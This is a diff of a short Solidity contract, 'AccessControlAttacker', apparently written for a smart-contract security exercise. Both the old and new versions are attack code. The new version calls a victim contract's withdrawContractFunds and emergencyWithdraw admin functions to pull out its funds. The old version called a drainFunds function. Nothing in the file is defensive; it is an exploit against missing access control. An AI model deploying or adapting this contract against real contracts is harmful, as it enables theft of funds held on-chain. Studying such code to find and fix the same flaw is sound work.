@@ -1,29 +1,28 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.18;
 
-interface IAccessVictim {
-    function drainFunds(address payable recipient) external;
+interface IVictim {
+
+    function withdrawContractFunds() external;
+    function emergencyWithdraw() external;
+
 }
 
 contract AccessControlAttacker {
-    IAccessVictim public victim;
 
-    event AttackStarted(address victim);
-    event AttackFinished(uint256 stolenAmount);
+    IVictim public victim;
 
-    constructor(address _victim) {
-        victim = IAccessVictim(_victim);
+    constructor(address _victim){
+        victim = IVictim(_victim);
     }
 
-    function attack() external {
-        emit AttackStarted(address(victim));
-        victim.drainFunds(payable(address(this)));
-        emit AttackFinished(address(this).balance);
+    function exploit() public {
+
+        // Try to call admin functions
+        victim.withdrawContractFunds();
+
+        victim.emergencyWithdraw();
+
     }
 
-    function getBalance() external view returns (uint256) {
-        return address(this).balance;
-    }
-
-    receive() external payable {}
 }
